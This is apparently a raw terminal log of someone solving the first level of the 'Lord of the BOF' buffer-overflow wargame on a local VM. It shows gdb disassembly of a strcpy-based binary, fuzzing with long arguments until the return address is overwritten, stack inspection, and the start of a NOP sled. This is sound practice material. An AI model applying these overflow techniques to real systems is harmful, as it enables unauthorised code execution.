@@ -1,0 +1,2148 @@
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________-------------------------- 
+
+
+login: q
+Password: 
+
+Login incorrect
+
+login: gata^He^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H^H
+Password: 
+Login incorrect
+
+login: gata
+Password: 
+Login incorrect
+
+login: gate
+Password: 
+Last login: Sat Jan 20 01:58:43 on tty6
+[gate@localhost gate]$ ls
+core  gremlin  gremlin.c  grenlin  tmp
+[gate@localhost gate]$ grenlin f
+bash: grenlin: command not found
+[gate@localhost gate]$ ./grenlin f
+f
+[gate@localhost gate]$ ./grenlin ffffffffffffffffffffffffffffffffffffffffffffffffffffal
+ffffffffffffffffffffffffffffffffffffffffffffffffffffal
+[gate@localhost gate]$ bash2
+[gate@localhost gate]$ ls
+core  gremlin  gremlin.c  grenlin  tmp
+[gate@localhost gate]$ clear
+[gate@localhost gate]$ gdb q
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+
+q: No such file or directory.
+
+(gdb) q  
+[gate@localhost gate]$ gdb -q
+(gdb) q
+[gate@localhost gate]$ gdb grenlin
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) ls
+Undefined command: "ls".  Try "help".
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:	push   %ebp
+0x8048431 <main+1>:	mov    %esp,%ebp
+0x8048433 <main+3>:	sub    $0x100,%esp
+0x8048439 <main+9>:	cmpl   $0x1,0x8(%ebp)
+0x804843d <main+13>:	jg     0x8048456 <main+38>
+0x804843f <main+15>:	push   $0x80484e0
+0x8048444 <main+20>:	call   0x8048350 <printf>
+0x8048449 <main+25>:	add    $0x4,%esp
+0x804844c <main+28>:	push   $0x0
+0x804844e <main+30>:	call   0x8048360 <exit>
+0x8048453 <main+35>:	add    $0x4,%esp
+0x8048456 <main+38>:	mov    0xc(%ebp),%eax
+0x8048459 <main+41>:	add    $0x4,%eax
+0x804845c <main+44>:	mov    (%eax),%edx
+0x804845e <main+46>:	push   %edx
+0x804845f <main+47>:	lea    0xffffff00(%ebp),%eax
+0x8048465 <main+53>:	push   %eax
+0x8048466 <main+54>:	call   0x8048370 <strcpy>
+0x804846b <main+59>:	add    $0x8,%esp
+0x804846e <main+62>:	lea    0xffffff00(%ebp),%eax
+0x8048474 <main+68>:	push   %eax
+0x8048475 <main+69>:	push   $0x80484ec
+0x804847a <main+74>:	call   0x8048350 <printf>
+0x804847f <main+79>:	add    $0x8,%esp
+0x8048482 <main+82>:	leave  
+0x8048483 <main+83>:	ret    
+End of assembler dump.
+(gdb) disas strcpy
+Dump of assembler code for function strcpy:
+0x8048370 <strcpy>:	jmp    *0x8049530
+0x8048376 <strcpy+6>:	push   $0x28
+0x804837b <strcpy+11>:	jmp    0x8048310 <_init+48>
+End of assembler dump.
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:	push   %ebp
+0x8048431 <main+1>:	mov    %esp,%ebp
+0x8048433 <main+3>:	sub    $0x100,%esp
+0x8048439 <main+9>:	cmpl   $0x1,0x8(%ebp)
+0x804843d <main+13>:	jg     0x8048456 <main+38>
+0x804843f <main+15>:	push   $0x80484e0
+0x8048444 <main+20>:	call   0x8048350 <printf>
+0x8048449 <main+25>:	add    $0x4,%esp
+0x804844c <main+28>:	push   $0x0
+0x804844e <main+30>:	call   0x8048360 <exit>
+0x8048453 <main+35>:	add    $0x4,%esp
+0x8048456 <main+38>:	mov    0xc(%ebp),%eax
+0x8048459 <main+41>:	add    $0x4,%eax
+0x804845c <main+44>:	mov    (%eax),%edx
+0x804845e <main+46>:	push   %edx
+0x804845f <main+47>:	lea    0xffffff00(%ebp),%eax
+0x8048465 <main+53>:	push   %eax
+0x8048466 <main+54>:	call   0x8048370 <strcpy>
+0x804846b <main+59>:	add    $0x8,%esp
+0x804846e <main+62>:	lea    0xffffff00(%ebp),%eax
+0x8048474 <main+68>:	push   %eax
+0x8048475 <main+69>:	push   $0x80484ec
+0x804847a <main+74>:	call   0x8048350 <printf>
+0x804847f <main+79>:	add    $0x8,%esp
+0x8048482 <main+82>:	leave  
+0x8048483 <main+83>:	ret    
+End of assembler dump.
+(gdb) esp       
+Undefined command: "esp".  Try "help".
+(gdb) i esp
+Undefined info command: "esp".  Try "help info".
+(gdb) $esp
+Undefined command: "".  Try "help".
+(gdb) x/ $esp
+No registers.
+(gdb) r `python -c 'print "hi"'`
+Starting program: /home/gate/grenlin `python -c 'print "hi"'`
+hi
+
+Program exited with code 03.
+(gdb) r `python -c 'print "a"*10'`
+Starting program: /home/gate/grenlin `python -c 'print "a"*10'`
+aaaaaaaaaa
+
+Program exited with code 013.
+(gdb) r `python -c 'print "a"*100'`
+Starting program: /home/gate/grenlin `python -c 'print "a"*100'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program exited with code 0145.
+(gdb) r `python -c 'print "a"*1000'`
+Starting program: /home/gate/grenlin `python -c 'print "a"*1000'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616161 in ?? ()
+(gdb) r `python -c 'print "a"*256'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/gate/grenlin `python -c 'print "a"*256'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program exited with code 01.
+(gdb) r `python -c 'print "a"*255'`
+Starting program: /home/gate/grenlin `python -c 'print "a"*255'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program exited normally.
+(gdb) r `python -c 'print "a"*260'`
+Starting program: /home/gate/grenlin `python -c 'print "a"*260'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x40030902 in __libc_start_main (main=Cannot access memory at address 0x61616169
+) at ../sysdeps/generic/libc-start.c:61
+61	../sysdeps/generic/libc-start.c: No such file or directory.
+(gdb) 
+(gdb) 
+(gdb) 
+(gdb) 
+(gdb) 
+(gdb) 
+(gdb) r `python -c 'print "a"*260'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/gate/grenlin `python -c 'print "a"*260'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x40030902 in __libc_start_main (main=Cannot access memory at address 0x61616169
+) at ../sysdeps/generic/libc-start.c:61
+61	../sysdeps/generic/libc-start.c: No such file or directory.
+(gdb) r `python -c 'print "a"*260'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y^Hb
+Starting program: /home/gate/grenlin `python -c 'print "a"*260'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x40030902 in __libc_start_main (main=Cannot access memory at address 0x61616169
+) at ../sysdeps/generic/libc-start.c:61
+61	../sysdeps/generic/libc-start.c: No such file or directory.
+(gdb) n
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+(gdb) r `python -c 'print "a"*26'`
+Starting program: /home/gate/grenlin `python -c 'print "a"*26'`
+aaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program exited with code 033.
+(gdb) r `python -c 'print "a"*2'`
+Starting program: /home/gate/grenlin `python -c 'print "a"*2'`
+aa
+
+Program exited with code 03.
+(gdb) r `python -c 'print "A"*200'`
+Starting program: /home/gate/grenlin `python -c 'print "A"*200'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program exited with code 0311.
+(gdb) x/ $esp
+No registers.
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:	push   %ebp
+0x8048431 <main+1>:	mov    %esp,%ebp
+0x8048433 <main+3>:	sub    $0x100,%esp
+0x8048439 <main+9>:	cmpl   $0x1,0x8(%ebp)
+0x804843d <main+13>:	jg     0x8048456 <main+38>
+0x804843f <main+15>:	push   $0x80484e0
+0x8048444 <main+20>:	call   0x8048350 <printf>
+0x8048449 <main+25>:	add    $0x4,%esp
+0x804844c <main+28>:	push   $0x0
+0x804844e <main+30>:	call   0x8048360 <exit>
+0x8048453 <main+35>:	add    $0x4,%esp
+0x8048456 <main+38>:	mov    0xc(%ebp),%eax
+0x8048459 <main+41>:	add    $0x4,%eax
+0x804845c <main+44>:	mov    (%eax),%edx
+0x804845e <main+46>:	push   %edx
+0x804845f <main+47>:	lea    0xffffff00(%ebp),%eax
+0x8048465 <main+53>:	push   %eax
+0x8048466 <main+54>:	call   0x8048370 <strcpy>
+0x804846b <main+59>:	add    $0x8,%esp
+0x804846e <main+62>:	lea    0xffffff00(%ebp),%eax
+0x8048474 <main+68>:	push   %eax
+0x8048475 <main+69>:	push   $0x80484ec
+0x804847a <main+74>:	call   0x8048350 <printf>
+0x804847f <main+79>:	add    $0x8,%esp
+0x8048482 <main+82>:	leave  
+0x8048483 <main+83>:	ret    
+End of assembler dump.
+(gdb) b *main+59
+Breakpoint 1 at 0x804846b: file gremlin.c, line 14.
+(gdb) r `python -c 'print "A"*200'`
+Starting program: /home/gate/grenlin `python -c 'print "A"*200'`
+
+Breakpoint 1, 0x804846b in main (argc=2, argv=0xbffffa94) at gremlin.c:14
+14	    strcpy(buffer, argv[1]);
+(gdb) x/ $esp
+0xbffff940:	0xbffff948
+(gdb) x/ $esp
+0xbffff940:	0xbffff948
+(gdb) 
+0xbffff944:	0xbffffba6
+(gdb) 
+0xbffff948:	0x41414141
+(gdb) x/10 $esp
+0xbffff940:	0xbffff948	0xbffffba6	0x41414141	0x41414141
+0xbffff950:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff960:	0x41414141	0x41414141
+(gdb)          
+0xbffff968:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff978:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff988:	0x41414141	0x41414141
+(gdb) x/10 $esp
+0xbffff940:	0xbffff948	0xbffffba6	0x41414141	0x41414141
+0xbffff950:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff960:	0x41414141	0x41414141
+(gdb) 
+0xbffff968:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff978:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff988:	0x41414141	0x41414141
+(gdb) 
+0xbffff990:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9b0:	0x41414141	0x41414141
+(gdb) 
+0xbffff9b8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9c8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9d8:	0x41414141	0x41414141
+(gdb) 
+0xbffff9e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffa00:	0x41414141	0x41414141
+(gdb) 
+0xbffffa08:	0x41414141	0x41414141	0x08048100	0x0804951c
+0xbffffa18:	0x08048256	0x40021ca0	0xbffffa48	0x4000a970
+0xbffffa28:	0x400f855b	0x08049510
+(gdb) 
+0xbffffa30:	0x4000ae60	0xbffffa94	0xbffffa48	0x0804841b
+0xbffffa40:	0x080494fc	0x08049510	0xbffffa68	0x400309cb
+0xbffffa50:	0x00000002	0xbffffa94
+(gdb) 
+0xbffffa58:	0xbffffaa0	0x40013868	0x00000002	0x08048380
+0xbffffa68:	0x00000000	0x080483a1	0x08048430	0x00000002
+0xbffffa78:	0xbffffa94	0x080482e0
+(gdb) Quit
+(gdb) Quit
+(gdb) Quit
+(gdb) Quit
+(gdb) Quit
+(gdb) info b
+Num Type           Disp Enb Address    What
+1   breakpoint     keep y   0x0804846b in main at gremlin.c:14
+	breakpoint already hit 1 time
+(gdb) 
+Connection closed by foreign host.
+
+Disconnected from remote host(192.168.56.128:23) at 00:04:25.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+[c:\~]$ 
+[c:\~]$ 
+[c:\~]$ 
+[c:\~]$ telnet 192.168.56.128
+
+Connecting to 192.168.56.128:23...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+                                            _______________________
+  _______________________-------------------                       `\
+ /:--__                                                              |
+||< > |                                   ___________________________/
+| \__/_________________-------------------                         |
+|                                                                  |
+ |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
+ |                                                                  |
+ |                                                                  |
+  |       [enter to the dungeon]                                    |
+  |       gate : gate                                                |
+  |                                                                  |
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________-------------------------- 
+
+
+login: 
+Connection closed by foreign host.
+
+Disconnected from remote host(새 세션) at 01:16:09.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ talnet
+'talnet'은(는) 내부 또는 외부 명령, 실행할 수 있는 프로그램, 또는
+배치 파일이 아닙니다.
+
+[c:\~]$ telnet 192.168.56.128
+
+
+Connecting to 192.168.56.128:23...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+                                            _______________________
+  _______________________-------------------                       `\
+ /:--__                                                              |
+||< > |                                   ___________________________/
+| \__/_________________-------------------                         |
+|                                                                  |
+ |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
+ |                                                                  |
+ |                                                                  |
+  |       [enter to the dungeon]                                    |
+  |       gate : gate                                                |
+  |                                                                  |
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________-------------------------- 
+
+
+login: gate
+Password: 
+Last login: Sat Feb  3 00:32:32 on tty2
+[gate@localhost gate]$ ls
+core  gremlin  gremlin.c  grenlin  tmp
+[gate@localhost gate]$ grenlin `python -c 'print "A"*235'f
+> ;
+> `
+  File "<string>", line 1
+    print "A"*235f
+                 ^
+SyntaxError: invalid syntax
+bash: syntax error near unexpected token `;'
+bash: command substitution: line 2: `;'
+bash: grenlin: command not found
+[gate@localhost gate]$ grenlin `python -c 'print "A"*235'f`
+  File "<string>", line 1
+    print "A"*235f
+                 ^
+SyntaxError: invalid syntax
+bash: grenlin: command not found
+[gate@localhost gate]$ grenlin `python -c 'print "A"*235'`f
+bash: grenlin: command not found
+[gate@localhost gate]$ ./grenlin `python -c 'print "A"*235'`f
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf
+[gate@localhost gate]$ gdb grenlin                           
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:	push   %ebp
+0x8048431 <main+1>:	mov    %esp,%ebp
+0x8048433 <main+3>:	sub    $0x100,%esp
+0x8048439 <main+9>:	cmpl   $0x1,0x8(%ebp)
+0x804843d <main+13>:	jg     0x8048456 <main+38>
+0x804843f <main+15>:	push   $0x80484e0
+0x8048444 <main+20>:	call   0x8048350 <printf>
+0x8048449 <main+25>:	add    $0x4,%esp
+0x804844c <main+28>:	push   $0x0
+0x804844e <main+30>:	call   0x8048360 <exit>
+0x8048453 <main+35>:	add    $0x4,%esp
+0x8048456 <main+38>:	mov    0xc(%ebp),%eax
+0x8048459 <main+41>:	add    $0x4,%eax
+0x804845c <main+44>:	mov    (%eax),%edx
+0x804845e <main+46>:	push   %edx
+0x804845f <main+47>:	lea    0xffffff00(%ebp),%eax
+0x8048465 <main+53>:	push   %eax
+0x8048466 <main+54>:	call   0x8048370 <strcpy>
+0x804846b <main+59>:	add    $0x8,%esp
+0x804846e <main+62>:	lea    0xffffff00(%ebp),%eax
+0x8048474 <main+68>:	push   %eax
+0x8048475 <main+69>:	push   $0x80484ec
+0x804847a <main+74>:	call   0x8048350 <printf>
+0x804847f <main+79>:	add    $0x8,%esp
+0x8048482 <main+82>:	leave  
+0x8048483 <main+83>:	ret    
+End of assembler dump.
+(gdb) b *main+59
+Breakpoint 1 at 0x804846b: file gremlin.c, line 14.
+(gdb) r `python -c 'print "AB"*130'
+Starting program: /home/gate/grenlin `python -c 'print "AB"*130'
+/bin/bash: unexpected EOF while looking for ``'
+/bin/bash: -c: line 2: syntax error
+
+Program exited with code 02.
+You can't do that without a process to debug.
+(gdb) x/100 $esp
+No registers.
+(gdb) r `python -c 'print "AB"*130'
+Starting program: /home/gate/grenlin `python -c 'print "AB"*130'
+/bin/bash: unexpected EOF while looking for ``'
+/bin/bash: -c: line 2: syntax error
+
+Program exited with code 02.
+You can't do that without a process to debug.
+(gdb) r `python -c 'print "AB"*130'`
+Starting program: /home/gate/grenlin `python -c 'print "AB"*130'`
+
+Breakpoint 1, 0x804846b in main (argc=2, argv=0xbffffa94) at gremlin.c:14
+14	    strcpy(buffer, argv[1]);
+(gdb) x/100 $esp
+0xbffff940:	0xbffff948	0xbffffb9c	0x42414241	0x42414241
+0xbffff950:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff960:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff970:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff980:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff990:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff9a0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff9b0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff9c0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff9d0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff9e0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffff9f0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffa00:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffa10:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffa20:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffa30:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffa40:	0x42414241	0x42414241	0x42414241	0x40030900
+0xbffffa50:	0x00000002	0xbffffa94	0xbffffaa0	0x40013868
+0xbffffa60:	0x00000002	0x08048380	0x00000000	0x080483a1
+0xbffffa70:	0x08048430	0x00000002	0xbffffa94	0x080482e0
+0xbffffa80:	0x080484bc	0x4000ae60	0xbffffa8c	0x40013e90
+0xbffffa90:	0x00000002	0xbffffb89	0xbffffb9c	0x00000000
+0xbffffaa0:	0xbffffca1	0xbffffcc3	0xbffffccd	0xbffffcdb
+0xbffffab0:	0xbffffcfa	0xbffffd07	0xbffffd1f	0xbffffd39
+0xbffffac0:	0xbffffd44	0xbffffd52	0xbffffd92	0xbffffda2
+(gdb) 
+0xbffffad0:	0xbffffdb7	0xbffffdc7	0xbffffdd1	0xbffffded
+0xbffffae0:	0xbffffe06	0xbffffe11	0xbffffe1e	0xbffffe26
+0xbffffaf0:	0x00000000	0x00000003	0x08048034	0x00000004
+0xbffffb00:	0x00000020	0x00000005	0x00000006	0x00000006
+0xbffffb10:	0x00001000	0x00000007	0x40000000	0x00000008
+0xbffffb20:	0x00000000	0x00000009	0x08048380	0x0000000b
+0xbffffb30:	0x000001f4	0x0000000c	0x000001f4	0x0000000d
+0xbffffb40:	0x000001f4	0x0000000e	0x000001f4	0x00000010
+0xbffffb50:	0x0fabfbff	0x0000000f	0xbffffb84	0x00000000
+0xbffffb60:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb70:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb80:	0x00000000	0x36383669	0x6f682f00	0x672f656d
+0xbffffb90:	0x2f657461	0x6e657267	0x006e696c	0x42414241
+0xbffffba0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffbb0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffbc0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffbd0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffbe0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffbf0:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffc00:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffc10:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffc20:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffc30:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffc40:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffc50:	0x42414241	0x42414241	0x42414241	0x42414241
+(gdb) 
+0xbffffc60:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffc70:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffc80:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffc90:	0x42414241	0x42414241	0x42414241	0x42414241
+0xbffffca0:	0x53454c00	0x45504f53	0x2f7c3d4e	0x2f727375
+0xbffffcb0:	0x2f6e6962	0x7373656c	0x65706970	0x2068732e
+0xbffffcc0:	0x55007325	0x4e524553	0x3d454d41	0x53494800
+0xbffffcd0:	0x5a495354	0x30313d45	0x48003030	0x4e54534f
+0xbffffce0:	0x3d454d41	0x61636f6c	0x736f686c	0x6f6c2e74
+0xbffffcf0:	0x646c6163	0x69616d6f	0x4f4c006e	0x4d414e47
+0xbffffd00:	0x61673d45	0x52006574	0x544f4d45	0x534f4845
+0xbffffd10:	0x39313d54	0x36312e32	0x36352e38	0x4d00312e
+0xbffffd20:	0x3d4c4941	0x7261762f	0x6f70732f	0x6d2f6c6f
+0xbffffd30:	0x2f6c6961	0x65746167	0x52455400	0x74783d4d
+0xbffffd40:	0x006d7265	0x54534f48	0x45505954	0x3833693d
+0xbffffd50:	0x41500036	0x2f3d4854	0x2f727375	0x61636f6c
+0xbffffd60:	0x69622f6c	0x622f3a6e	0x2f3a6e69	0x2f727375
+0xbffffd70:	0x3a6e6962	0x7273752f	0x3131582f	0x622f3652
+0xbffffd80:	0x2f3a6e69	0x656d6f68	0x7461672f	0x69622f65
+0xbffffd90:	0x4f48006e	0x2f3d454d	0x656d6f68	0x7461672f
+0xbffffda0:	0x4e490065	0x52545550	0x652f3d43	0x692f6374
+0xbffffdb0:	0x7475706e	0x53006372	0x4c4c4548	0x69622f3d
+0xbffffdc0:	0x61622f6e	0x55006873	0x3d524553	0x65746167
+0xbffffdd0:	0x53414200	0x4e455f48	0x682f3d56	0x2f656d6f
+0xbffffde0:	0x65746167	0x61622e2f	0x63726873	0x53494400
+(gdb) r `python -c 'print "\x90"*130'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/gate/grenlin `python -c 'print "\x90"*130'`
+
+Breakpoint 1, 0x804846b in main (argc=2, argv=0xbffffb14) at gremlin.c:14
+14	    strcpy(buffer, argv[1]);
+(gdb) x/100 $esp
+0xbffff9c0:	0xbffff9c8	0xbffffc1e	0x90909090	0x90909090
+0xbffff9d0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff9e0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff9f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffa00:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffa10:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffa20:	0x90909090	0x90909090	0x90909090	0x90909090
